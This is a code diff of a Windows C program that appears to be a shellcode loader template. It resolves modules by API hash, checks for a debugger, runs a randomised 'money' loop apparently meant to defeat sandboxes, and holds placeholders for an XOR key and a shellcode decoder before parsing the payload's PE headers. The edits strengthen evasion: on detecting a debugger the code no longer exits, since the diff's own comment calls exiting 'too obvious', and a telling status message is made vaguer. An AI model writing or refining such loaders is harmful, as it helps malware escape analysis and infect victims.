@@ -40,7 +40,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     
     // Seed the random number generator
     srand(time(NULL));
-    uint16_t key = %XOR_KEY%; // Placeholder for XOR key
+    uint16_t key = %__XOR_KEY__%; // Placeholder for XOR key
     char path[MAX_PATH]; 
     int min = 4000; // Minimum range for random money
     int max = 17000; // Maximum range for random money
@@ -50,14 +50,14 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     
     printf("beginning\n");    
     HMODULE hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
-    HMODULE hUser32dll = NULL; // Placeholder for Kernel32 module handle
-    hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
+    HMODULE hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
     // Check if the program is being debugged
     if (is_being_debugged()) {
         printf("Error during file openning\n"); // Debugging detected
-        // return 1;
+        money_spent += money;
+        // exiting here is too obvious
     } else {
-        printf("No debugging detected\n"); // No debugging detected
+        printf("Success\n"); // No debugging detected
         // hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
     }
 
@@ -105,8 +105,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
         // Execute payload if no money was spent
         // Step 0 : Decode the payload
-        %SHELLCODE_DECODER% // Placeholder for shellcode decoding logic
-        /*-SHELLCODE_DECODER-*/
+        %__SHELLCODE_DECODER__% // Placeholder for shellcode decoding logic
         // Step 1 : Get DLL's NT headers
 
         PIMAGE_NT_HEADERS64 dll_htHeaders = PE_getNtheaders(payload);
